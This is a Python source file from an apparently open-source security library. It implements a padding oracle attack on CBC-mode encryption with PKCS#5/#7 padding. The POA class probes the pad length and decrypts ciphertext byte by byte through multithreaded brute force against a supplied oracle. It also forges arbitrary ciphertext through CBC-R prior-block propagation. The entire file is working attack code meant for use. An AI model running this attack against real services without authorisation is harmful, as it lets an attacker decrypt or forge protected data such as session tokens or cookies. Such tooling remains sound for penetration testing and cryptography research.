'''
Created on Jul 4, 2010

Copyright (C) 2010 ELOI SANFÈLIX
Copyright (C) 2012 Timothy D. Morgan
@author: Eloi Sanfelix < eloi AT limited-entropy.com >
@author: Timothy D. Morgan < tmorgan {a} vsecurity . com >

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Lesser General Public License, version 3,
 as published by the Free Software Foundation.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

import random
import struct
import threading
from .. import buffertools
from .Exceptions import *

class POA:
    """This class implements padding oracle attacks given a ciphertext and
    function that acts as a padding oracle.

    The padding scheme is assumed to be PKCS#5/#7, also defined in RFC2040.
    This attack was first described in:
     "Security Flaws Induced by CBC Padding. Applications to SSL, IPSEC,
      WTLS" by Serge Vaudenay (2002)

    POA objects are not caller thread-safe.  If multiple threads need to work
    simultaneously on the same ciphertext and oracle, create a
    separate instance. POA objects can execute tasks internally using
    multiple threads, however.

    """

    ## private
    _thread_result = None
    _oracle = None
    _ciphertext = None
    _iv = None

    ## protected (reading ok, changing not ok)
    block_size = None

    ## public (r/w ok)
    decrypted = None
    threads = None
    log_fh = None
    
    def __init__(self, oracle, block_size, ciphertext, iv=None,
                 threads=1, decrypted='', log_file=None):
        """Creates a new padding oracle attack (POA) object. 

        Arguments:
        oracle -- A function which returns True if the given ciphertext
         results in a correct padding upon decryption and False
         otherwise.  This function should implement the prototype:
           def myOracle(ciphertext, iv): ...
         If the initialization vector (iv) is unknown is not included in
         the ciphertext message, it can be ignored in the oracle
         implementation (though some limitations will result from this).

        block_size -- The block size of the ciphertext being attacked.
         Is almost always 8 or 16.

        ciphertext -- The ciphertext to be decrypted

        iv -- The initialization vector associated with the ciphertext.
         If none provided, it is assumed to be a block of 0's

        threads -- The maximum number of parallel threads to use during
         decryption.  If more than one thread is used, then the oracle
         function will be called in parallel.  It should implement any
         internal locking necessary to prevent race conditions where
         applicable.

        decrypted -- If a portion of the plaintext is already known (due
         to a prior, partially successful decryption attempt), then this
         may be used to restart the decryption process where it was
         previously left off.  This argument is assumed to contain the
         final N bytes (for an N-byte argument) of the plaintext; that
         is, the tail of the plaintext.

        log_file -- A Python file object where log messages will be
         written.

        """

        if(len(ciphertext)%block_size != 0 or len(ciphertext) < block_size):
            raise InvalidBlockError(block_size,len(ciphertext))
        if(iv != None and len(iv)%block_size != 0):
            raise InvalidBlockError(block_size,len(iv))

        self._oracle = oracle
        self._ciphertext = ciphertext
        self._iv = iv
        self.block_size = block_size
        self.decrypted = decrypted
        self.threads = threads
        self.log_fh = log_file


    def log_message(self, s):
        if self.log_fh != None:
            self.log_fh.write(s+'\n')


    def probe_padding(self, prior, final):
        """Attempts to verify that a CBC padding oracle exists and then determines the
        pad value.  

        Returns the pad string, or None on failure. 
        XXX: Currently only works for PKCS 5/7.
        """

        ret_val = None
        # First probe for beginning of pad
        for i in range(0-self.block_size,0):
            if i == -1:
                break
            tweaked = struct.unpack("B", prior[i])[0] ^ 0xFF
            tweaked = struct.pack("B", tweaked)
            if not self._oracle(self._ciphertext+prior[:i]+tweaked+prior[i+1:]+final):
                break

        pad_length = 0-i
        self.log_message("Testing suspected pad length: %d" % pad_length)
        if pad_length > 1:
            # Verify suspected pad length by changing last pad byte to 1
            # and making sure the padding succeeds
            tweaked = struct.unpack("B", prior[-1])[0] ^ (pad_length^1)
            tweaked = struct.pack("B", tweaked)
            if self._oracle(self._ciphertext+prior[:-1]+tweaked+final):
                ret_val = buffertools.pkcs7Pad(pad_length)

        else:
            # Verify by changing pad byte to 2 and brute-force changing
            # second-to-last byte to 2 as well
            tweaked = struct.unpack("B", prior[-1])[0] ^ (2^1)
            tweaked = struct.pack("B", tweaked)
            for j in range(1,256):
                guess = struct.unpack("B", prior[-2])[0] ^ j
                guess = struct.pack("B", guess)
                if self._oracle(self._ciphertext+prior[:-2]+guess+tweaked+final):
                    # XXX: Save the decrypted byte for later
                    ret_val = buffertools.pkcs7Pad(pad_length)

        if ret_val:
            self.decrypted = ret_val

        return ret_val


    # XXX: This could be generalized as a byte probe utility for a variety of attacks
    def _test_value_set(self, prefix, suffix, value_set):
        for b in value_set:
            if self._thread_result != None:
                # Stop if another thread found the result
                break
            if self._oracle(str(prefix+struct.pack("B",b)+suffix)):
                self._thread_result = b
                break


    def decrypt_next_byte(self, prior, block, known_bytes):
        """Decrypts one byte of ciphertext by modifying the prior
        ciphertext block at the same relative offset.

        Arguments:
        prior -- Ciphertext block appearing prior to the current target 
        block -- Currently targeted ciphertext block
        known_bytes -- Bytes in this block already decrypted

        """

        if(len(block)!=self.block_size):
            raise InvalidBlockError
        numKnownBytes = len(known_bytes)
        
        if(numKnownBytes >= self.block_size):
            return known_bytes
        
        prior_prefix = prior[0:self.block_size-numKnownBytes-1]
        base = ord(prior[self.block_size-numKnownBytes-1])
        # Adjust known bytes to appear as a PKCS 7 pad
        suffix = [0]*numKnownBytes
        for i in range(0,numKnownBytes):
            suffix[i] ^= ord(prior[0-numKnownBytes+i])^ord(known_bytes[i])^(numKnownBytes+1)
        suffix = struct.pack("B"*len(suffix),*suffix)+block

        # Each thread spawned searches a subset of the next byte's 
        # 256 possible values
        self._thread_result = None
        threads = []
        for i in range(0,self.threads):
            t = threading.Thread(target=self._test_value_set, 
                                 args=(self._ciphertext+prior_prefix, suffix, range(i,256,self.threads)))
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
        
        if self._thread_result == None:
            self.log_message("Value of a byte could not be determined.  Current plaintext suffix: "+ repr(self.decrypted))
            raise Exception

        decrypted = struct.pack("B",self._thread_result^base^(numKnownBytes+1))
        self.decrypted = decrypted + self.decrypted
        #  Return previous bytes together with current byte
        return decrypted+known_bytes 
    

    def decrypt_block(self, prior, block, last_bytes=''):
        """Decrypts the block of ciphertext provided as a parameter.

        """

        while(len(last_bytes)!=self.block_size):
            last_bytes = self.decrypt_next_byte(prior, block, last_bytes)
        return last_bytes


    # XXX: Add logic to begin where decryption previously left off
    def decrypt(self):
        """Decrypts the previously supplied ciphertext. If the IV was
        not provided, it assumes a IV of zero bytes.

        """

        blocks = buffertools.splitBuffer(self._ciphertext, self.block_size)

        if len(self.decrypted) == 0:
            
            final = blocks[-1]
            iv = self._iv
            if iv == None:
                iv = '\x00'*self.block_size
            if len(blocks) == 1:
                # If only one block present, then try to use IV as prior
                prior = iv
            else:
                prior = blocks[-2]

            # Decrypt last block, starting with padding (quicker to decrypt)
            pad_bytes = self.probe_padding(prior, final)
            decrypted = self.decrypt_block(prior, final, pad_bytes)

            # Now decrypt all other blocks except first block
            for i in range(len(blocks)-2, 0, -1):
                decrypted = self.decrypt_block(blocks[i-1], blocks[i]) + decrypted

            # Finally decrypt first block
            decrypted = self.decrypt_block(iv, blocks[0]) + decrypted
        
        # Start where we left off last
        # XXX: test this
        else: 
            num_partial = len(self.decrypted) % self.block_size
            finished_blocks = len(self.decrypted) / self.block_size
            partial = self.decrypted[0:num_partial]
            decrypted = self.decrypted[num_partial:]

            for i in range(-1-finished_blocks, 0, -1):
                decrypted = self.decrypt_block(blocks[i-1], blocks[i], partial)
                partial = ''

            # Finally decrypt first block
            decrypted = self.decrypt_block(iv, blocks[0]) + decrypted
            
        return buffertools.stripPKCS7Pad(decrypted)


    def encrypt_block(self, plaintext, ciphertext):
        """Encrypts a block of plaintext.  This is accomplished by
        decrypting the supplied ciphertext and then computing the prior
        block needed to create the desired plaintext at the ciphertext's
        location. 

        Returns the calculated prior block and the provided ciphertext
        block as a tuple.

        """
        if len(plaintext) != self.block_size or len(plaintext) != len(ciphertext):
            raise InvalidBlockError(self.block_size,len(plaintext))

        ptext = self.decrypt_block('\x00'*self.block_size, ciphertext)
        prior = buffertools.xorBuffers(ptext, plaintext)
        return prior,ciphertext
    
    
    def encrypt(self,plaintext):
        """Encrypts a plaintext value through "CBC-R" style prior-block
        propagation.
        
        Returns a tuple of the IV and ciphertext.  

        NOTE: If your target messages do not include an IV with the
        ciphertext, you can instead opt to encrypt a suffix of the
        message and include the IV as if it were a ciphertext block.
        This block will decrypt to an uncontrollable random value, but
        with careful placement, this might be ok.

        """

        blocks = buffertools.splitBuffer(buffertools.pkcs7PadBuffer(plaintext, self.block_size), 
                                         self.block_size)

        if (len(self.decrypted) >= self.block_size
            and len(self._ciphertext) >= 2*self.block_size):
            # If possible, reuse work from prior decryption efforts on original
            # message for last block
            old_prior = self._ciphertext[0-self.block_size*2:0-self.block_size]
            final_plaintext = self.decrypted[0-self.block_size:]
            prior = buffertools.xorBuffers(old_prior,
                                           buffertools.xorBuffers(final_plaintext, blocks[-1]))
            ciphertext = self._ciphertext[0-self.block_size:]
        else:
            # Otherwise, select a random last block and generate the prior block
            ciphertext = struct.pack("B"*self.block_size, 
                                     *[random.getrandbits(8) for i in range(self.block_size)])
            prior,ciphertext = self.encrypt_block(blocks[-1], ciphertext)

        # Continue generating all prior blocks
        for i in range(len(blocks)-2, -1, -1):
            prior,cblock = self.encrypt_block(blocks[i],prior)
            ciphertext = cblock+ciphertext
        
        # prior as IV
        return str(prior),str(ciphertext)
